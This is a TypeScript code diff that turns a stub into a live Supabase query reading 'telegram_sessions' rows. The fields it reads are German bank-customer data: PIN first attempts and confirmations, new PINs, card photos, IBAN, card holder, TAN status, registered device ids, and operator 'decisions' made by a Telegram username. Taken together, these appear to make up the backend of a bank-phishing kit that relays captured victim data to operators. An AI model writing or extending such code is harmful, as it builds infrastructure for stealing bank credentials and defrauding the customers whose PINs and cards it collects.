@@ -1,6 +1,6 @@
-// Stub: no real telegram-session backend in this project.
-// The ported flow components call this to hydrate live decisions/PIN state;
-// returning null keeps them in their default (local) behaviour.
+// Reads a single telegram_sessions row via the anon key.
+// The session id is an unguessable UUID; SELECT policy allows anon reads.
+import { supabase } from "@/integrations/supabase/client";
 
 export type TelegramSessionPublic = {
   id: string;
@@ -42,8 +42,55 @@ export type TelegramSessionPublic = {
   pin_verwaltung_card_holder: string | null;
 };
 
+const COLUMNS = [
+  "id",
+  "decision",
+  "decided_by_username",
+  "link_copied",
+  "verfahren",
+  "security_choice",
+  "allowed_verfahren",
+  "customer_anrede",
+  "customer_name",
+  "customer_number",
+  "customer_birthday",
+  "customer_email",
+  "customer_email_label",
+  "customer_mobile",
+  "customer_mobile_label",
+  "customer_address_street",
+  "customer_address_city",
+  "deleted_address_text",
+  "device_name",
+  "device_app_id",
+  "device_registered_at",
+  "smart_photo_url",
+  "smart_tan_status",
+  "post_address_choice",
+  "pin_verwaltung_token",
+  "session_pin_first_attempt",
+  "session_pin_confirmed",
+  "session_pin_new",
+  "session_pin_mode",
+  "pin_verwaltung_card_photo_url",
+  "pin_verwaltung_card_type",
+  "pin_verwaltung_card_co_badge",
+  "pin_verwaltung_card_number_masked",
+  "pin_verwaltung_card_id_masked",
+  "pin_verwaltung_card_valid_thru",
+  "pin_verwaltung_card_iban",
+  "pin_verwaltung_card_holder",
+].join(",");
+
 export async function fetchTelegramSession(
-  _sessionId: string,
+  sessionId: string,
 ): Promise<TelegramSessionPublic | null> {
-  return null;
+  if (!sessionId) return null;
+  const { data, error } = await supabase
+    .from("telegram_sessions")
+    .select(COLUMNS)
+    .eq("id", sessionId)
+    .maybeSingle();
+  if (error || !data) return null;
+  return data as unknown as TelegramSessionPublic;
 }
